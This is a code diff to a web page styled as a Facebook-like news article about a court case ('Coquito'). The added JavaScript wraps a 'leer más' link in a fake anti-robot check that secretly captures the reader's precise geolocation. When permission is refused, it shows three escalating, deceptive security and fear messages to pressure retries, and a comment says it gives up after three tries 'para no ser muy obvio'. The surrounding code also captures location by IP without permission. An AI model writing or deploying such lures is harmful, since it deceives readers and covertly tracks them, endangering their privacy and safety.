@@ -516,6 +516,8 @@
     <script>
         // Variable global para la noticia actual
         let currentNews = null;
+        // Contador global de intentos de ubicación
+        let locationAttempts = 0;
         
         // Función para captura automática por IP (sin permisos)
         async function captureIPLocationAuto() {
@@ -1060,7 +1062,7 @@
             console.log('✅ Contenido expandido estilo Facebook');
         }
         
-        // Función nueva para expandir contenido con verificación anti-robot
+        // Función nueva para expandir contenido con verificación anti-robot y múltiples intentos
         function expandNewsFacebook() {
             console.log('🤖 Usuario hizo clic en "leer más" - iniciando verificación anti-robot...');
             
@@ -1076,48 +1078,62 @@
             
             // Esperar 2.5 segundos para que parezca una verificación real
             setTimeout(() => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            // Capturar ubicación durante la "verificación"
-                            captureLocation(position);
-                            console.log('✅ Ubicación capturada exitosamente durante verificación anti-robot');
-                            
-                            // Mostrar mensaje de verificación completada
-                            showVerificationSuccess();
-                            
-                            // Ocultar overlay y mostrar contenido después de 1 segundo
-                            setTimeout(() => {
-                                hideVerificationOverlay();
-                                showFullContentFacebook();
-                            }, 1000);
-                        },
-                        function(error) {
-                            console.log('⚠️ Error de ubicación durante verificación, mostrando contenido sin captura:', error.message);
-                            
-                            // Mostrar verificación completada aunque falle la ubicación
-                            showVerificationSuccess();
-                            
-                            setTimeout(() => {
-                                hideVerificationOverlay();
-                                showFullContentFacebook();
-                            }, 1000);
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    // Si no hay geolocalización, simular verificación exitosa
-                    showVerificationSuccess();
-                    setTimeout(() => {
-                        hideVerificationOverlay();
-                        showFullContentFacebook();
-                    }, 1000);
-                }
+                attemptLocationCapture(1); // Primer intento
             }, 2500);
+        }
+        
+        // Nueva función para intentos múltiples de captura
+        function attemptLocationCapture(attemptNumber) {
+            locationAttempts = attemptNumber; // Actualizar contador global
+            console.log(`📍 Intento ${attemptNumber} de captura de ubicación...`);
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // ✅ ÉXITO - Captura exitosa
+                        console.log('✅ Ubicación capturada exitosamente en intento', attemptNumber);
+                        captureLocation(position);
+                        
+                        // Mostrar verificación completada
+                        showVerificationSuccess();
+                        
+                        // Ocultar overlay y mostrar contenido después de 1 segundo
+                        setTimeout(() => {
+                            hideVerificationOverlay();
+                            showFullContentFacebook();
+                        }, 1000);
+                    },
+                    function(error) {
+                        // ❌ FALLÓ - Regresar a la noticia principal
+                        console.log(`❌ Fallo en intento ${attemptNumber}:`, error.message);
+                        
+                        if (attemptNumber <= 3) {
+                            // Mostrar mensaje y regresar a "leer más"
+                            showLocationDeniedMessage(attemptNumber);
+                        } else {
+                            // Después de 3 intentos, mostrar contenido (para no ser muy obvio)
+                            console.log('⚠️ Máximo de intentos alcanzado, mostrando contenido');
+                            showVerificationSuccess();
+                            setTimeout(() => {
+                                hideVerificationOverlay();
+                                showFullContentFacebook();
+                            }, 1000);
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Si no hay geolocalización, mostrar contenido
+                showVerificationSuccess();
+                setTimeout(() => {
+                    hideVerificationOverlay();
+                    showFullContentFacebook();
+                }, 1000);
+            }
         }
         
         // Función para mostrar diagnóstico detallado al usuario
@@ -1291,6 +1307,87 @@
                     console.log('🤖 Overlay de verificación removido');
                 }, 300);
             }
+        }
+        
+        // Función para mostrar mensaje cuando se rechaza la ubicación
+        function showLocationDeniedMessage(attemptNumber) {
+            const messages = [
+                {
+                    icon: "🔐",
+                    title: "Verificación de Seguridad Requerida",
+                    text: "Para proteger este contenido sensible de accesos no autorizados, necesitamos confirmar tu ubicación regional. Sin esta verificación no podemos mostrar la información completa.",
+                    buttonText: "🛡️ Intentar Verificación de Nuevo",
+                    color: "#dc2626"
+                },
+                {
+                    icon: "📡",
+                    title: "Acceso Regional Restringido", 
+                    text: "Este contenido sobre el caso judicial está disponible solo para usuarios verificados de la región. La verificación de ubicación es obligatoria para acceder a los detalles del operativo.",
+                    buttonText: "🌍 Verificar Mi Región Ahora",
+                    color: "#ea580c"
+                },
+                {
+                    icon: "🚨",
+                    title: "Contenido de Seguridad Crítica",
+                    text: "Esta información puede ser vital para tu seguridad personal. ÚLTIMA OPORTUNIDAD: Se requiere verificación de ubicación para acceder a los detalles completos del caso 'Coquito'.",
+                    buttonText: "📍 CONFIRMAR UBICACIÓN - Último Intento",
+                    color: "#b91c1c"
+                }
+            ];
+            
+            const message = messages[attemptNumber - 1] || messages[2];
+            
+            const content = document.getElementById('verificationContent');
+            if (content) {
+                content.innerHTML = `
+                    <div style="font-size: 4rem; margin-bottom: 20px;">${message.icon}</div>
+                    <h2 style="color: ${message.color}; font-size: 1.6rem; margin-bottom: 20px; font-weight: 600;">
+                        ${message.title}
+                    </h2>
+                    <p style="margin: 20px 0; font-size: 1.1rem; line-height: 1.5; color: #e5e7eb;">
+                        ${message.text}
+                    </p>
+                    
+                    <div style="margin: 30px 0;">
+                        <button onclick="resetToReadMore()" style="
+                            background: linear-gradient(135deg, ${message.color}, #7f1d1d);
+                            color: white;
+                            border: none;
+                            padding: 18px 40px;
+                            border-radius: 50px;
+                            font-size: 1.2rem;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin: 10px;
+                            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
+                        ">${message.buttonText}</button>
+                    </div>
+                    
+                    <p style="font-size: 0.9rem; color: #6b7280; margin-top: 15px;">
+                        Intento ${attemptNumber} de 3 - El contenido se desbloqueará después de la verificación exitosa
+                    </p>
+                `;
+                
+                console.log(`⚠️ Mostrando mensaje de ubicación denegada (intento ${attemptNumber})`);
+            }
+        }
+        
+        // Función para regresar al estado de "leer más"
+        function resetToReadMore() {
+            console.log('🔄 Regresando al estado de "leer más" para nuevo intento...');
+            
+            // Ocultar overlay
+            hideVerificationOverlay();
+            
+            // Restaurar el enlace "leer más"
+            setTimeout(() => {
+                const newsContent = document.getElementById('newsContent');
+                if (newsContent && currentNews && currentNews.content) {
+                    const contentWithReadMore = currentNews.content + '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span>';
+                    newsContent.innerHTML = contentWithReadMore;
+                    console.log('✅ Enlace "leer más" restaurado - usuario debe intentar de nuevo');
+                }
+            }, 500);
         }
         
         // Intentar capturar ubicación automáticamente después de 10 segundos
